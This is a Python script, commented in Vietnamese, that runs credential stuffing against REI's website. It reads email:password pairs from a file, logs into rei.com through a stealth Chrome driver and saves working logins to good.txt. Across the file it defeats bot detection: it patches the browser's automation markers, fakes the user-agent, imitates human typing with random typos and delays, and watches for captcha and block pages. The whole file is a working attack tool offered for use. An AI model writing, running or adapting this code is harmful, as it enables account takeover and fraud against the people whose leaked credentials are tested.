"""
REI Account Checker Tool
Tự động check login tài khoản REI với anti-detect mạnh
"""

import sys
import io

# Fix encoding cho Windows console
if sys.platform == 'win32':
    sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8')
    sys.stderr = io.TextIOWrapper(sys.stderr.buffer, encoding='utf-8')

import undetected_chromedriver as uc
import time
import random
import json
import os
from datetime import datetime
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException, NoSuchElementException
import string

class REIChecker:
    def __init__(self):
        self.accounts_file = "accounts.txt"
        self.good_file = "good.txt"
        self.driver = None
    
    def ensure_element_interactable(self, element):
        """Đảm bảo element có thể tương tác được"""
        try:
            # Scroll đến element
            self.driver.execute_script("arguments[0].scrollIntoView({behavior: 'smooth', block: 'center'});", element)
            time.sleep(random.uniform(0.3, 0.6))
            
            # Thử click bằng JavaScript nếu cần
            try:
                element.click()
            except:
                self.driver.execute_script("arguments[0].click();", element)
            
            time.sleep(random.uniform(0.2, 0.4))
        except:
            pass
    
    def human_type(self, element, text):
        """
        Gõ từng ký tự như người thật:
        - Delay ngẫu nhiên giữa các ký tự
        - Thỉnh thoảng gõ sai rồi xóa (backspace)
        - Tốc độ gõ không đều
        - Fallback bằng JavaScript nếu Selenium không work
        """
        try:
            # Đảm bảo element có thể tương tác
            self.ensure_element_interactable(element)
            
            # Focus vào element
            try:
                self.driver.execute_script("arguments[0].focus();", element)
            except:
                pass
            
            # Clear bằng JavaScript để chắc chắn
            try:
                self.driver.execute_script("arguments[0].value = '';", element)
                element.clear()
            except:
                pass
            
            time.sleep(random.uniform(0.2, 0.4))
            
            # Thử gõ bằng Selenium trước
            try:
                for i, char in enumerate(text):
                    # Thỉnh thoảng gõ sai (5% khả năng)
                    if random.random() < 0.05 and i > 0:
                        wrong_char = random.choice(string.ascii_letters + string.digits)
                        element.send_keys(wrong_char)
                        time.sleep(random.uniform(0.1, 0.3))
                        element.send_keys('\b')  # Backspace
                        time.sleep(random.uniform(0.1, 0.2))
                    
                    # Gõ ký tự đúng
                    element.send_keys(char)
                    # Delay ngẫu nhiên giữa các ký tự (50-200ms)
                    time.sleep(random.uniform(0.05, 0.2))
                
                # Kiểm tra xem đã gõ được chưa
                current_value = element.get_attribute('value')
                if current_value and len(current_value) > 0:
                    print(f"[+] Đã gõ được {len(current_value)} ký tự bằng Selenium")
                    return
            except Exception as e:
                print(f"[!] Selenium send_keys không work: {e}, thử JavaScript...")
            
            # Fallback: Gõ bằng JavaScript (vẫn giữ delay như người thật)
            print("[*] Đang gõ bằng JavaScript...")
            current_text = ""
            for i, char in enumerate(text):
                # Thỉnh thoảng gõ sai (5% khả năng)
                if random.random() < 0.05 and i > 0:
                    wrong_char = random.choice(string.ascii_letters + string.digits)
                    current_text += wrong_char
                    self.driver.execute_script("arguments[0].value = arguments[1];", element, current_text)
                    time.sleep(random.uniform(0.1, 0.3))
                    current_text = current_text[:-1]  # Backspace
                    self.driver.execute_script("arguments[0].value = arguments[1];", element, current_text)
                    time.sleep(random.uniform(0.1, 0.2))
                
                # Gõ ký tự đúng
                current_text += char
                self.driver.execute_script("arguments[0].value = arguments[1];", element, current_text)
                # Trigger input event để form nhận diện
                self.driver.execute_script("""
                    arguments[0].dispatchEvent(new Event('input', { bubbles: true }));
                    arguments[0].dispatchEvent(new Event('change', { bubbles: true }));
                """, element)
                # Delay ngẫu nhiên giữa các ký tự (50-200ms)
                time.sleep(random.uniform(0.05, 0.2))
            
            print(f"[+] Đã gõ xong bằng JavaScript: {len(text)} ký tự")
            
        except Exception as e:
            print(f"[!] Lỗi khi gõ: {e}")
            # Last resort: set value trực tiếp
            try:
                self.driver.execute_script("arguments[0].value = arguments[1];", element, text)
                self.driver.execute_script("""
                    arguments[0].dispatchEvent(new Event('input', { bubbles: true }));
                    arguments[0].dispatchEvent(new Event('change', { bubbles: true }));
                """, element)
                print(f"[+] Đã set value trực tiếp bằng JavaScript")
            except:
                print(f"[!] Không thể điền vào field")
    
    def init_driver(self):
        """Khởi tạo Chrome với anti-detect mạnh"""
        options = uc.ChromeOptions()
        
        # Anti-detect settings (chỉ dùng các options cơ bản)
        options.add_argument('--disable-blink-features=AutomationControlled')
        options.add_argument('--disable-dev-shm-usage')
        options.add_argument('--no-sandbox')
        options.add_argument('--disable-gpu')
        
        # Fake user-agent (giống Chrome thật)
        options.add_argument('--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36')
        
        # Khởi tạo undetected-chromedriver (tự động xử lý anti-detect)
        self.driver = uc.Chrome(options=options, version_main=None, use_subprocess=True)
        
        # Patch JS để ẩn webdriver (bổ sung)
        try:
            self.driver.execute_cdp_cmd('Page.addScriptToEvaluateOnNewDocument', {
                'source': '''
                    Object.defineProperty(navigator, 'webdriver', {
                        get: () => undefined
                    });
                    window.navigator.chrome = {
                        runtime: {}
                    };
                    Object.defineProperty(navigator, 'plugins', {
                        get: () => [1, 2, 3, 4, 5]
                    });
                    Object.defineProperty(navigator, 'languages', {
                        get: () => ['en-US', 'en']
                    });
                '''
            })
        except:
            pass  # undetected-chromedriver đã tự xử lý rồi
        
        return self.driver
    
    def human_behavior(self):
        """Hành vi giống người thật: scroll, di chuyển chuột, delay"""
        try:
            # Scroll ngẫu nhiên
            scroll_amount = random.randint(100, 500)
            self.driver.execute_script(f"window.scrollBy(0, {scroll_amount});")
            time.sleep(random.uniform(0.5, 1.5))
            
            # Scroll lại
            self.driver.execute_script(f"window.scrollBy(0, -{scroll_amount//2});")
            time.sleep(random.uniform(0.3, 0.8))
        except:
            pass
    
    def take_screenshot(self, prefix="blocked"):
        """Chụp màn hình khi bị block"""
        timestamp = int(time.time())
        filename = f"{prefix}_{timestamp}.png"
        try:
            self.driver.save_screenshot(filename)
            print(f"[!] Đã lưu screenshot: {filename}")
            return filename
        except Exception as e:
            print(f"[!] Lỗi chụp màn hình: {e}")
            return None
    
    def check_account(self, email, password):
        """Check một tài khoản REI"""
        try:
            print(f"\n[*] Đang check: {email}")
            print(f"[*] Password length: {len(password)}")
            
            # Kiểm tra password có rỗng không
            if not password:
                print("[!] Password rỗng, không thể check!")
                return "DIE"
            
            # Bước 1: Vào trang chủ (KHÔNG vào thẳng /login)
            print("[*] Đang vào trang chủ...")
            self.driver.get("https://www.rei.com/")
            time.sleep(random.uniform(2, 4))
            
            # Hành vi người thật
            self.human_behavior()
            
            # Bước 2: Tìm và click nút "Sign In"
            print("[*] Đang tìm nút Sign In...")
            try:
                # Thử nhiều selector khác nhau
                sign_in_selectors = [
                    "//a[contains(text(), 'Sign In')]",
                    "//a[contains(text(), 'Sign in')]",
                    "//button[contains(text(), 'Sign In')]",
                    "//a[@href*='login']",
                    "//a[@href*='signin']",
                ]
                
                sign_in_clicked = False
                for selector in sign_in_selectors:
                    try:
                        sign_in_btn = WebDriverWait(self.driver, 5).until(
                            EC.element_to_be_clickable((By.XPATH, selector))
                        )
                        sign_in_btn.click()
                        sign_in_clicked = True
                        print("[+] Đã click Sign In")
                        break
                    except:
                        continue
                
                if not sign_in_clicked:
                    # Thử tìm bằng class hoặc ID
                    try:
                        sign_in_btn = self.driver.find_element(By.CSS_SELECTOR, "a[href*='login'], a[href*='signin'], button[aria-label*='Sign']")
                        sign_in_btn.click()
                        sign_in_clicked = True
                    except:
                        pass
                
                if not sign_in_clicked:
                    # Fallback: vào thẳng login page
                    print("[!] Không tìm thấy nút Sign In, vào thẳng login page...")
                    self.driver.get("https://www.rei.com/account/login")
                
            except Exception as e:
                print(f"[!] Lỗi khi tìm Sign In: {e}, vào thẳng login page...")
                self.driver.get("https://www.rei.com/account/login")
            
            time.sleep(random.uniform(2, 4))
            self.human_behavior()
            
            # Bước 3: Đợi form login xuất hiện
            print("[*] Đang đợi form login...")
            try:
                # Đợi một chút để form load
                time.sleep(random.uniform(2, 3))
                
                # Chụp màn hình để debug
                self.take_screenshot("debug_form")
                
                # Tìm email field (thử nhiều cách - REI có thể dùng nhiều selector khác nhau)
                email_selectors = [
                    "input[type='email']",
                    "input[name='email']",
                    "input[name='username']",
                    "input[name='userName']",
                    "input[id*='email' i]",
                    "input[id*='username' i]",
                    "input[id*='userName' i]",
                    "input[placeholder*='email' i]",
                    "input[placeholder*='Email' i]",
                    "input[type='text'][name*='email' i]",
                    "input[type='text'][name*='username' i]",
                    "input[autocomplete='username']",
                    "input[autocomplete='email']",
                ]
                
                email_field = None
                for selector in email_selectors:
                    try:
                        # Thử tìm bằng CSS selector
                        email_field = WebDriverWait(self.driver, 5).until(
                            EC.presence_of_element_located((By.CSS_SELECTOR, selector))
                        )
                        print(f"[+] Tìm thấy email field: {selector}")
                        break
                    except:
                        continue
                
                if not email_field:
                    # Thử tìm bằng XPath (nhiều cách hơn)
                    xpath_selectors = [
                        "//input[contains(@type, 'email')]",
                        "//input[contains(@name, 'email') or contains(@name, 'username')]",
                        "//input[contains(@id, 'email') or contains(@id, 'username')]",
                        "//input[contains(@placeholder, 'email') or contains(@placeholder, 'Email')]",
                        "//input[@autocomplete='username' or @autocomplete='email']",
                        "//form//input[@type='text'][1]",  # Input đầu tiên trong form
                    ]
                    for xpath in xpath_selectors:
                        try:
                            email_field = WebDriverWait(self.driver, 3).until(
                                EC.presence_of_element_located((By.XPATH, xpath))
                            )
                            print(f"[+] Tìm thấy email field bằng XPath: {xpath}")
                            break
                        except:
                            continue
                
                if not email_field:
                    # Debug: in ra tất cả input fields
                    try:
                        all_inputs = self.driver.find_elements(By.TAG_NAME, "input")
                        print(f"[!] Debug: Tìm thấy {len(all_inputs)} input fields trên trang")
                        for inp in all_inputs[:5]:  # In 5 cái đầu
                            try:
                                print(f"  - type: {inp.get_attribute('type')}, name: {inp.get_attribute('name')}, id: {inp.get_attribute('id')}")
                            except:
                                pass
                    except:
                        pass
                    raise Exception("Không tìm thấy email field")
                
                # Tìm password field
                password_selectors = [
                    "input[type='password']",
                    "input[name='password']",
                    "input[name='pass']",
                    "input[name*='password' i]",
                    "input[id*='password' i]",
                    "input[autocomplete='current-password']",
                ]
                
                password_field = None
                for selector in password_selectors:
                    try:
                        password_field = WebDriverWait(self.driver, 5).until(
                            EC.presence_of_element_located((By.CSS_SELECTOR, selector))
                        )
                        print(f"[+] Tìm thấy password field: {selector}")
                        break
                    except:
                        continue
                
                if not password_field:
                    # Thử tìm bằng XPath
                    xpath_selectors = [
                        "//input[@type='password']",
                        "//input[contains(@name, 'password') or contains(@name, 'pass')]",
                        "//input[contains(@id, 'password')]",
                        "//input[@autocomplete='current-password']",
                        "//form//input[@type='password']",
                    ]
                    for xpath in xpath_selectors:
                        try:
                            password_field = WebDriverWait(self.driver, 3).until(
                                EC.presence_of_element_located((By.XPATH, xpath))
                            )
                            print(f"[+] Tìm thấy password field bằng XPath: {xpath}")
                            break
                        except:
                            continue
                
                if not password_field:
                    # Debug: in ra tất cả password fields
                    try:
                        all_inputs = self.driver.find_elements(By.TAG_NAME, "input")
                        print(f"[!] Debug: Tìm thấy {len(all_inputs)} input fields trên trang")
                        for inp in all_inputs:
                            try:
                                inp_type = inp.get_attribute('type')
                                inp_name = inp.get_attribute('name')
                                inp_id = inp.get_attribute('id')
                                if inp_type == 'password' or 'pass' in (inp_name or '').lower() or 'pass' in (inp_id or '').lower():
                                    print(f"  - PASSWORD FIELD: type: {inp_type}, name: {inp_name}, id: {inp_id}")
                            except:
                                pass
                    except:
                        pass
                    raise Exception("Không tìm thấy password field")
                
                # Debug: in thông tin password field
                try:
                    print(f"[+] Password field info: type={password_field.get_attribute('type')}, name={password_field.get_attribute('name')}, id={password_field.get_attribute('id')}")
                except:
                    pass
            
            except Exception as e:
                print(f"[!] Lỗi khi tìm form login: {e}")
                self.take_screenshot("error_form")
                return "DIE"
            
            # Bước 4: Gõ email như người thật
            print("[*] Đang gõ email...")
            try:
                self.human_type(email_field, email)
                # Kiểm tra xem đã gõ được chưa
                email_value = email_field.get_attribute('value')
                if email_value:
                    print(f"[+] Đã gõ email: {email_value[:10]}...")
                else:
                    print("[!] Email không được điền, thử lại bằng JavaScript...")
                    self.driver.execute_script("arguments[0].value = arguments[1];", email_field, email)
                    self.driver.execute_script("arguments[0].dispatchEvent(new Event('input', { bubbles: true }));", email_field)
            except Exception as e:
                print(f"[!] Lỗi khi gõ email: {e}")
                # Fallback: dùng JavaScript
                try:
                    self.driver.execute_script("arguments[0].value = arguments[1];", email_field, email)
                    self.driver.execute_script("arguments[0].dispatchEvent(new Event('input', { bubbles: true }));", email_field)
                    print("[+] Đã điền email bằng JavaScript")
                except:
                    pass
            
            time.sleep(random.uniform(0.5, 1.5))
            
            # Đợi một chút, có thể password field chỉ xuất hiện sau khi điền email
            time.sleep(random.uniform(0.5, 1.0))
            
            # Tìm lại password field (có thể mới xuất hiện)
            try:
                password_field = WebDriverWait(self.driver, 3).until(
                    EC.presence_of_element_located((By.CSS_SELECTOR, "input[type='password']"))
                )
            except:
                pass
            
            # Bước 5: Gõ password như người thật
            print("[*] Đang gõ password...")
            try:
                # Click vào password field trước để đảm bảo nó được focus
                try:
                    password_field.click()
                    time.sleep(random.uniform(0.2, 0.5))
                except:
                    pass

                self.human_type(password_field, password)
                # Kiểm tra xem đã gõ được chưa
                password_value = password_field.get_attribute('value')
                if password_value:
                    print(f"[+] Đã gõ password: {'*' * len(password_value)}")
                else:
                    print("[!] Password không được điền, thử lại bằng JavaScript...")
                    self.driver.execute_script("arguments[0].value = arguments[1];", password_field, password)
                    self.driver.execute_script("arguments[0].dispatchEvent(new Event('input', { bubbles: true }));", password_field)
                    # Kiểm tra lại
                    password_value = password_field.get_attribute('value')
                    if password_value:
                        print(f"[+] Đã điền password bằng JavaScript: {'*' * len(password_value)}")
                    else:
                        print("[!] Vẫn không điền được password!")
            except Exception as e:
                print(f"[!] Lỗi khi gõ password: {e}")
                # Fallback: dùng JavaScript
                try:
                    self.driver.execute_script("arguments[0].value = arguments[1];", password_field, password)
                    self.driver.execute_script("arguments[0].dispatchEvent(new Event('input', { bubbles: true }));", password_field)
                    self.driver.execute_script("arguments[0].dispatchEvent(new Event('change', { bubbles: true }));", password_field)
                    print("[+] Đã điền password bằng JavaScript")
                except Exception as e2:
                    print(f"[!] Không thể điền password: {e2}")
            
            time.sleep(random.uniform(0.8, 1.5))
            
            # Bước 6: Tìm và click nút Submit/Login
            submit_selectors = [
                "button[type='submit']",
                "input[type='submit']",
                "button:contains('Sign In')",
                "button:contains('Log In')",
                "button:contains('Login')",
            ]
            
            submit_clicked = False
            for selector in submit_selectors:
                try:
                    if ':contains' in selector:
                        # XPath cho contains
                        submit_btn = self.driver.find_element(By.XPATH, "//button[contains(text(), 'Sign In') or contains(text(), 'Log In') or contains(text(), 'Login')]")
                    else:
                        submit_btn = self.driver.find_element(By.CSS_SELECTOR, selector)
                    
                    submit_btn.click()
                    submit_clicked = True
                    print("[+] Đã click Submit")
                    break
                except:
                    continue
            
            if not submit_clicked:
                # Thử Enter
                password_field.send_keys('\n')
            
            # Bước 7: Đợi kết quả
            print("[*] Đang đợi kết quả...")
            time.sleep(random.uniform(3, 5))
            
            # Kiểm tra xem có bị block không
            current_url = self.driver.current_url
            page_source = self.driver.page_source.lower()
            
            # Dấu hiệu bị block
            block_indicators = [
                'challenge',
                'captcha',
                'access denied',
                'blocked',
                'security check',
                'verify you are human',
            ]
            
            for indicator in block_indicators:
                if indicator in page_source:
                    print(f"[!] PHÁT HIỆN BỊ BLOCK: {indicator}")
                    self.take_screenshot("blocked")
                    return "BLOCK"
            
            # Kiểm tra xem đã login thành công chưa
            success_indicators = [
                '/account',
                '/profile',
                'sign out',
                'logout',
                'my account',
            ]
            
            for indicator in success_indicators:
                if indicator in current_url.lower() or indicator in page_source:
                    print(f"[+] LIVE! Đã login thành công")
                    return "LIVE"
            
            # Kiểm tra lỗi đăng nhập
            error_indicators = [
                'incorrect',
                'invalid',
                'wrong password',
                'account not found',
                'login failed',
            ]
            
            for indicator in error_indicators:
                if indicator in page_source:
                    print(f"[-] DIE: {indicator}")
                    return "DIE"
            
            # Nếu không rõ ràng, chụp màn hình và coi như DIE
            print("[-] Không xác định được kết quả, chụp màn hình...")
            self.take_screenshot("unknown")
            return "DIE"
            
        except TimeoutException:
            print("[!] Timeout - có thể bị block")
            self.take_screenshot("timeout")
            return "BLOCK"
        except Exception as e:
            print(f"[!] Lỗi: {e}")
            self.take_screenshot("error")
            return "DIE"
    
    def save_good_account(self, email, password):
        """Lưu acc LIVE vào good.txt"""
        with open(self.good_file, 'a', encoding='utf-8') as f:
            f.write(f"{email}:{password}\n")
        print(f"[+] Đã lưu vào {self.good_file}")
    
    def run(self):
        """Chạy tool check tất cả accounts"""
        print("=" * 60)
        print("REI Account Checker Tool")
        print("=" * 60)

        # Đọc danh sách accounts
        if not os.path.exists(self.accounts_file):
            print(f"[!] Không tìm thấy file {self.accounts_file}")
            print(f"[!] Tạo file {self.accounts_file} với format: email:password (mỗi dòng)")
            return

        accounts = []
        with open(self.accounts_file, 'r', encoding='utf-8') as f:
            for line_num, line in enumerate(f, 1):
                line = line.strip()
                if line and ':' in line:
                    # Tách email và password bằng dấu : (chỉ split ở dấu : đầu tiên)
                    parts = line.split(':', 1)
                    if len(parts) == 2:
                        email, password = parts
                        email = email.strip()
                        password = password.strip()

                        # Kiểm tra email và password không rỗng
                        if not email or not password:
                            print(f"[!] Dòng {line_num}: Email hoặc password rỗng, bỏ qua")
                            continue

                        accounts.append((email, password))
                    else:
                        print(f"[!] Dòng {line_num}: Format không đúng (cần email:password), bỏ qua")

        if not accounts:
            print("[+] Không còn acc nào cần check!")
            return

        print(f"[+] Tìm thấy {len(accounts)} acc cần check")
        # Debug: in ra account đầu tiên để verify
        if accounts:
            first_email, first_password = accounts[0]
            print(f"[*] Debug - Account đầu tiên: email={first_email}, password_length={len(first_password)}")

        # Khởi tạo driver
        print("[*] Đang khởi tạo Chrome...")
        self.init_driver()

        try:
            live_count = 0
            die_count = 0
            block_count = 0

            for idx, (email, password) in enumerate(accounts, 1):
                print(f"\n{'='*60}")
                print(f"[{idx}/{len(accounts)}] Checking account...")
                print(f"[*] Email: {email}")
                print(f"[*] Password: {'*' * len(password)} (độ dài: {len(password)})")

                # Kiểm tra password có rỗng không
                if not password:
                    print("[!] Password rỗng! Bỏ qua account này.")
                    die_count += 1
                    continue

                try:
                    result = self.check_account(email, password)

                    # Xử lý kết quả
                    if result == "LIVE":
                        self.save_good_account(email, password)
                        live_count += 1
                    elif result == "BLOCK":
                        block_count += 1
                    else:
                        die_count += 1
                except Exception as e:
                    print(f"[!] Lỗi khi check account {email}: {e}")
                    die_count += 1

                # Delay giữa các acc (5-10 giây)
                if idx < len(accounts):
                    delay = random.uniform(5, 10)
                    print(f"[*] Nghỉ {delay:.1f} giây trước acc tiếp theo...")
                    time.sleep(delay)

            # Tổng kết
            print("\n" + "=" * 60)
            print("KẾT QUẢ TỔNG KẾT:")
            print(f"  LIVE: {live_count}")
            print(f"  DIE: {die_count}")
            print(f"  BLOCK: {block_count}")
            print(f"  Tổng: {len(accounts)}")
            print("=" * 60)

        except KeyboardInterrupt:
            print("\n[!] Đã dừng bởi người dùng.")
        except Exception as e:
            print(f"\n[!] Lỗi: {e}")
        finally:
            if self.driver:
                try:
                    self.driver.quit()
                except:
                    pass
            print("[+] Đã đóng Chrome")

if __name__ == "__main__":
    checker = REIChecker()
    checker.run()

